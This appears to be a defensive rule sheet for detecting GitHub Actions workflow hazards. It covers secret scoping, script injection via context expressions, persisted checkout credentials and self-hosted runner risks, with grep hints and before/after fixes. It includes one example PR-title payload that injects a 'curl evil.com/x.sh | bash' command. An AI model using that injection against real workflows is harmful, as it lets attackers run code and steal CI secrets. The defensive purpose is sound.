# GitHub Actions — Secret Handling, Script Injection, and Runner Hygiene

## Source

- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions — GitHub Actions security hardening (canonical, including the script-injection section)
- https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions — Secrets in GitHub Actions reference (declaring, scoping, masking)
- https://docs.github.com/en/actions/security-guides/encrypted-secrets — encrypted secrets storage and inheritance rules
- https://docs.github.com/en/actions/hosting-your-own-runners/security-hardening-for-self-hosted-runners — self-hosted runner hardening (NOT recommended for public repos)
- https://github.com/marketplace/actions/checkout — actions/checkout reference; `persist-credentials` default behaviour
- https://owasp.org/www-project-top-10-ci-cd-security-risks/ — OWASP CI/CD Top 10 (CICD-SEC-04 PPE; CICD-SEC-06 Insufficient Credential Hygiene; CICD-SEC-08 Ungoverned Usage of 3rd Party Services)
- https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html — OWASP Secrets Management Cheat Sheet

## Scope

Covers GitHub Actions workflow files (`.github/workflows/*.yml`, `*.yaml`) for: secret exfiltration via the `env:` channel, script-injection through GitHub-context expansions in `run:` blocks, persistence of `GITHUB_TOKEN` on the runner filesystem after `actions/checkout`, self-hosted runners on public repositories, and `workflow_call` inputs that lack type constraints. Out of scope: token-permission grants and action pinning (covered by `gh-actions-permissions.md`); secret rotation and storage outside Actions (separate operational concern); composite-action authoring (focus is on consumers).

## Dangerous patterns (regex/AST hints)

### Secret passed via `env:` to a step that runs untrusted code — CWE-200

- Why: When a workflow exports a secret as an environment variable available to a `run:` step that ALSO executes user-controllable code (e.g. `npm test` after a `checkout` of fork code, an `eslint` plugin from a forked PR, or any `make`/`bundle exec`/`go test` invocation that loads project-level configuration), the secret value is reachable from process memory, env-dumping commands (`env`, `printenv`), and child-process spawning. GitHub's own hardening guide is explicit: pass secrets only to steps that need them, and never to a step that loads or executes code from an untrusted source. The mitigation is to scope the `env:` block to a narrow step (the publish step that needs the token), not to the workflow or job.
- Grep: workflows where a `jobs.<id>.env:` (job-level) or top-level `env:` block declares a `${{ secrets.* }}` value AND the same job contains a `run:` step that invokes `npm test`, `npm run`, `pytest`, `go test`, `make`, `bundle exec`, `cargo test`, or any project-defined script before the secret-consuming step.
- File globs: `.github/workflows/*.y?(a)ml`
- Source: https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions

### Script injection via `${{ github.event.* }}` in `run:` block — CWE-94

- Why: GitHub-context expressions are interpolated into the shell as raw text BEFORE the shell parses the command. A pull-request title of `"; curl evil.com/x.sh | bash; #` interpolated into a `run: echo "Title: ${{ github.event.pull_request.title }}"` block becomes a shell command, executing on the runner with full job context. The class is "command injection via context expression"; the canonical attacker-controlled fields are `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref`, `github.event.comment.body`, `github.head_ref`, and any `github.event.review.body`. The safe pattern is to bind the expression to an environment variable with `env:` and reference `"$VAR"` from the shell — quotes are then enforced by the shell, not the YAML interpolator.
- Grep: `run:` block contents containing `\${{\s*github\.(event\.(issue|pull_request|comment|review)\.\w+|head_ref)\s*}}` directly inline (NOT via `env:` indirection).
- File globs: `.github/workflows/*.y?(a)ml`
- Source: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable

### `actions/checkout` with `persist-credentials: true` (or default) on shared/self-hosted runner — CWE-522

- Why: `actions/checkout` defaults to `persist-credentials: true`, which writes a Basic-auth header to `.git/config` containing the `GITHUB_TOKEN`. On GitHub-hosted runners this is fine — the runner is destroyed after the job. On self-hosted runners, the `.git/config` survives the job and is readable by subsequent jobs (and by any process on the runner host). On a self-hosted runner that handles work from multiple repos or from public-fork PRs, this becomes a credential-leak channel. Set `persist-credentials: false` and authenticate explicitly only in the steps that need to push.
- Grep: `uses:\s*actions/checkout@` blocks WITHOUT a subsequent `with:\n.*persist-credentials:\s*false` AND a workflow that declares `runs-on:\s*self-hosted`.
- File globs: `.github/workflows/*.y?(a)ml`
- Source: https://docs.github.com/en/actions/hosting-your-own-runners/security-hardening-for-self-hosted-runners

### Self-hosted runner used for `pull_request` from public fork — CWE-346

- Why: A self-hosted runner picking up a `pull_request` event from a public-repo fork executes the fork's code on hardware/VMs you control. Even with PPE mitigations, the runner host inherits build-toolchain side effects: cached `npm`/`pip` packages, environment leakage between jobs, and any persistent state on disk. GitHub's hardening guide explicitly recommends NOT using self-hosted runners with public repositories. The mitigations are: gate self-hosted runners to internal/private repos only, OR use a labelled-runner pattern where only `push` events from trusted refs target the self-hosted runner.
- Grep: workflows with `runs-on:\s*self-hosted` AND `on:` triggers including `pull_request:` AND repository visibility = public (cross-reference repo-level metadata, or flag any self-hosted+pull_request combination for human review).
- File globs: `.github/workflows/*.y?(a)ml`
- Source: https://docs.github.com/en/actions/hosting-your-own-runners/security-hardening-for-self-hosted-runners

### `workflow_call` reusable workflow without typed inputs — CWE-20

- Why: A reusable workflow declared with `on: workflow_call:` and no `inputs:` schema accepts arbitrary string inputs from any caller. A caller in a less-trusted repo (or a less-trusted branch) can pass a malformed input that, interpolated into a `run:` block downstream, becomes a script-injection vector. Typed inputs (`type: string`, `type: boolean`, `type: number`) at minimum enforce the value is the right shape; combined with explicit allow-listing in the consuming step (`if:` guards on input values), they shrink the attack surface to "the caller is allow-listed AND the input is well-formed".
- Grep: `on:\s*workflow_call:` blocks WITHOUT a child `inputs:` map declaring `type:` for each input AND with downstream `${{ inputs.* }}` interpolation in `run:`.
- File globs: `.github/workflows/*.y?(a)ml`
- Source: https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-inputs-and-secrets-in-a-reusable-workflow

## Secure patterns

Bind GitHub-context expression through `env:` indirection — quotes the shell can enforce:

```yaml
- name: Triage PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title: $PR_TITLE"
```

Source: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable

Disable credential persistence on `actions/checkout`:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  with:
    persist-credentials: false
```

Source: https://github.com/marketplace/actions/checkout

Typed `workflow_call` inputs:

```yaml
on:
  workflow_call:
    inputs:
      target_env:
        type: string
        required: true
      dry_run:
        type: boolean
        default: true
```

Source: https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-inputs-and-secrets-in-a-reusable-workflow

## Fix recipes

### Recipe: replace inline context interpolation with env-var binding — addresses CWE-94

**Before (dangerous):**

```yaml
- name: Comment on PR
  run: |
    echo "User said: ${{ github.event.comment.body }}"
    gh pr comment ${{ github.event.pull_request.number }} --body "Saw: ${{ github.event.comment.body }}"
```

**After (safe):**

```yaml
- name: Comment on PR
  env:
    COMMENT_BODY: ${{ github.event.comment.body }}
    PR_NUMBER: ${{ github.event.pull_request.number }}
  run: |
    echo "User said: $COMMENT_BODY"
    gh pr comment "$PR_NUMBER" --body "Saw: $COMMENT_BODY"
```

Source: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable

### Recipe: scope secrets to the publish step only — addresses CWE-200

**Before (dangerous):**

```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}   # available to every step in the job
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test           # third-party test code sees NPM_TOKEN
      - run: npm publish
```

**After (safe):**

```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - run: npm ci
      - run: npm test
      - name: Publish
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}   # scoped to this step only
        run: npm publish
```

Source: https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions

### Recipe: disable credential persistence on `actions/checkout` for self-hosted runners — addresses CWE-522

**Before (dangerous):**

```yaml
runs-on: self-hosted
steps:
  - uses: actions/checkout@v4
  - run: ./build.sh
```

**After (safe):**

```yaml
runs-on: self-hosted
steps:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
    with:
      persist-credentials: false
  - run: ./build.sh
```

Source: https://github.com/marketplace/actions/checkout

## Version notes

- `actions/checkout` `persist-credentials` defaults to `true` as of v4.x; the parameter has existed since v2 and is stable. Setting it to `false` is safe across all v2+ releases.
- The intermediate-env-var pattern for context expressions has been GitHub's official recommendation since the May 2020 hardening guide rewrite; it works on all current runner OS images.
- `workflow_call` typed inputs were added in October 2021; older reusable workflows pre-dating that may have untyped inputs and need migration when touched.

## Common false positives

- `${{ github.event.head_commit.message }}` in a `run:` step on a workflow gated by `on: push` of a *protected branch* — push to a protected branch is restricted to repo collaborators; the message is collaborator-controlled rather than attacker-controlled. Lower confidence; flag for human review rather than auto-blocking.
- `secrets.GITHUB_TOKEN` (the auto-provisioned token) used in `env:` at job level — `GITHUB_TOKEN` is short-lived (job duration) and scoped by `permissions:`. The exfiltration risk is real but bounded; downgrade to medium when the workflow has an explicit minimal `permissions:` block.
- `actions/checkout@v4` on a GitHub-hosted runner with default `persist-credentials: true` — the runner is destroyed after the job; the credential file does not persist across jobs. Flag only when paired with `runs-on: self-hosted`.
- `workflow_call` with no `inputs:` block at all — if the reusable workflow takes no inputs, there is no script-injection surface; do not flag.
